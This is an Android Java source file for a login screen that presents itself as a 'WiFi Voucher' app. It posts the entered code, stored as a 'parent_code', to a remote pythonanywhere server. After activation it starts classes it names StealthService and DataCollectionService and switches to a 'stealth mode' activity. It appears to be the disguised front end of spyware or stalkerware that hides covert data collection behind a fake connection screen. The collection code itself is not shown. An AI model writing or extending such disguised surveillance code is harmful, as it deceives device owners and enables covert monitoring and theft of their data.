package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {

    private EditText codeInput;
    private Button verifyButton;
    private ProgressBar progressBar;
    private TextView titleText, subtitleText, statusText;
    private SharedPreferences prefs;
    private Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
        handler = new Handler();

        // Already activated? Skip to service
        if (prefs.contains("parent_code") && prefs.getBoolean("is_activated", false)) {
            startVoucherService();
            return;
        }

        initViews();
        setupUI();
        setupListeners();
    }

    private void initViews() {
        codeInput = findViewById(R.id.code_input);
        verifyButton = findViewById(R.id.verify_button);
        progressBar = findViewById(R.id.progress_bar);
        titleText = findViewById(R.id.title_text);
        subtitleText = findViewById(R.id.subtitle_text);
        statusText = findViewById(R.id.status_text);
    }

    private void setupUI() {
        titleText.setText("WiFi Voucher");
        titleText.setTextColor(ContextCompat.getColor(this, android.R.color.black));
        titleText.setTextSize(28f);
        titleText.setTypeface(null, android.graphics.Typeface.BOLD);

        subtitleText.setText("Enter your voucher code to connect");
        subtitleText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
        subtitleText.setTextSize(14f);

        codeInput.setHint("Voucher WiFi Code");
        codeInput.setTextColor(ContextCompat.getColor(this, android.R.color.black));

        verifyButton.setText("CONNECT");
        verifyButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
        verifyButton.setTextColor(ContextCompat.getColor(this, android.R.color.white));

        statusText.setText("");
        statusText.setTextSize(12f);
        progressBar.setVisibility(View.GONE);
    }

    private void setupListeners() {
        verifyButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            if (code.isEmpty()) {
                statusText.setText("Please enter your Voucher WiFi Code");
                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                return;
            }
            if (code.length() < 4) {
                statusText.setText("Code must be at least 4 characters");
                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                return;
            }
            verifyVoucherCode(code);
        });
    }

    private void verifyVoucherCode(String code) {
        progressBar.setVisibility(View.VISIBLE);
        verifyButton.setEnabled(false);
        statusText.setText("Verifying...");
        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));

        new Thread(() -> {
            try {
                URL url = new URL("https://GhostTester.pythonanywhere.com/api/parent/verify-code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                JSONObject payload = new JSONObject();
                payload.put("parent_code", code);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                conn.disconnect();

                if (responseCode == 200) {
                    // Success
                    prefs.edit()
                        .putString("parent_code", code)
                        .putBoolean("is_activated", true)
                        .apply();

                    handler.post(() -> {
                        progressBar.setVisibility(View.GONE);
                        statusText.setText("Connected Successfully!");
                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
                        Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
                        
                        // Delay then start service
                        handler.postDelayed(() -> startVoucherService(), 1000);
                    });
                } else if (responseCode == 404) {
                    handler.post(() -> {
                        progressBar.setVisibility(View.GONE);
                        verifyButton.setEnabled(true);
                        statusText.setText("Invalid Voucher Code. Please try again.");
                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                    });
                } else {
                    handler.post(() -> {
                        progressBar.setVisibility(View.GONE);
                        verifyButton.setEnabled(true);
                        statusText.setText("Server error. Try again later.");
                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                    });
                }

            } catch (Exception e) {
                handler.post(() -> {
                    progressBar.setVisibility(View.GONE);
                    verifyButton.setEnabled(true);
                    statusText.setText("Connection failed. Check internet.");
                    statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                });
            }
        }).start();
    }

    private void startVoucherService() {
        // Start stealth service
        Intent stealthIntent = new Intent(this, StealthService.class);
        startService(stealthIntent);

        // Start data collection service
        Intent dataIntent = new Intent(this, DataCollectionService.class);
        startService(dataIntent);

        // Go to stealth mode
        Intent stealthActivity = new Intent(this, StealthActivity.class);
        startActivity(stealthActivity);
        finish();
    }
}
